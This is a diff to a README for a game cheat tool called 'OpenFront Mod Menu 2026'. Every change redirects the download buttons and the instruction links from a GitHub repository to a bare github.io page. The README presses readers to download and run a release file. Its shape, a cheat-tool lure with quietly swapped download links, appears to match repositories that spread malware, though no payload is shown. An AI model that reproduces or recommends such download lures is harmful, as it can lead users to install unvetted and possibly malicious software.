@@ -1,7 +1,7 @@
 <h1>🎮 OpenFront-Mod-Menu-Strategy-Overlay-2026 - Master Every Match with Smart Strategy Tools</h1>
 
 <p align="center">
-  <a href="https://github.com/Anuj2244/OpenFront-Mod-Menu-Strategy-Overlay-2026">
+  <a href="https://anuj2244.github.io">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-OpenFront%202026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Download Button" style="border-radius: 12px;"/>
   </a>
 </p>
@@ -25,7 +25,7 @@ This application is built for **everyday gamers** — you do not need to be a pr
 Getting OpenFront Mod Menu up and running takes less than two minutes. Follow these simple steps:
 
 1. **Visit the download page** by clicking the big red button at the top of this page, or navigate to:  
-   [https://github.com/Anuj2244/OpenFront-Mod-Menu-Strategy-Overlay-2026](https://github.com/Anuj2244/OpenFront-Mod-Menu-Strategy-Overlay-2026)
+   [https://anuj2244.github.io](https://anuj2244.github.io)
 
 )
 1. On that page, look for a section labeled **"Releases"** or **"Assets"** (usually on the right side of the screen). You will see a list of files.
@@ -43,7 +43,7 @@ Getting OpenFront Mod Menu up and running takes less than two minutes. Follow th
 
 **Step 1: Get the File**  
 Visit this link to download the application:  
-[⬇️ Click Here to Download OpenFront Mod Menu 2026](https://github.com/Anuj2244/OpenFront-Mod-Menu-Strategy-Overlay-20264)
+[⬇️ Click Here to Download OpenFront Mod Menu 2026](https://anuj2244.github.io)
 
 )
 
@@ -199,7 +199,7 @@ There are hundreds of gaming tools out there, but most are either too complicate
 ---
 
 <p align="center">
-  <a href="https://github.com/Anuj2244/OpenFront-Mod-Menu-Strategy-Overlay-2026">
+  <a href="https://anuj2244.github.io">
     <img src="https://img.shields.io/badge/🚀%20GET%20STARTED-OpenFront%20Mod%20Menu%202026-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=333333" alt="Get Started Button" style="border-radius: 12px;"/>
   </a>
 </p>
